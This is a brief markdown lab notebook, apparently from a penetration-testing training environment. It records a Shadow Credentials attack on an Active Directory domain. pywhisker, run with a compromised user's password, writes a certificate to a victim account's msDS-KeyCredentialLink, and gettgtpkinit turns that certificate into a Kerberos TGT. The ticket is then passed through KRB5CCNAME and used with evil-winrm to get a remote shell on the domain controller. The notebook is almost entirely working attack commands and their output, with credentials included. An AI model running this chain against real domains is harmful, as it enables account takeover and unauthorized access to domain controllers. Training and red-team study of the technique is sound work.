# generating x.509 cert
```
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```
>[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W  
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx  
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W  
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools  

- generates `x.506 cert` and writes it to the victim users `msds-keycredentiallink`



# aquire a tgt
```
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```



# ptt
```
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```





# using the rights of the victim
```
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```
- in this case the victim has the right `remote management group`









